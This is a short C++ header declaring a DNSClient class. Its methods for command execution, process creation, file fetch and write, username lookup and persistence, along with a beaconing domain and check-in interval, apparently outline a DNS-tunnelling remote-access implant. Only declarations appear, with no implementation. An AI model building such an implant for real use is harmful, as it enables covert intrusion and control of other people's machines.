#ifndef __DNSCLIENT_H__
#define __DNSCLIENT_H__

#include <deque>
#include <string>
#include <vector>
#include "Packet.h"
using namespace std;

class DNSClient
{
public:
	DNSClient();

	int main();
	bool sync();
	void pack_outbound_queue(unsigned char, string);
	string exec(const string&);
	string get_current_dir();
	string change_dir(const string&);
	void write_file(const string&);
	string fetch_file(const string&);
	string create_process(const string&);
	string query_username();
	string persist();

private:
	unsigned char client_id;
	string domain;
	unsigned int checkin_interval_ms;
	unsigned int send_delay_ms;
	deque<Packet> outbound_queue;
	vector<Packet> packet_buffer;
};

#endif
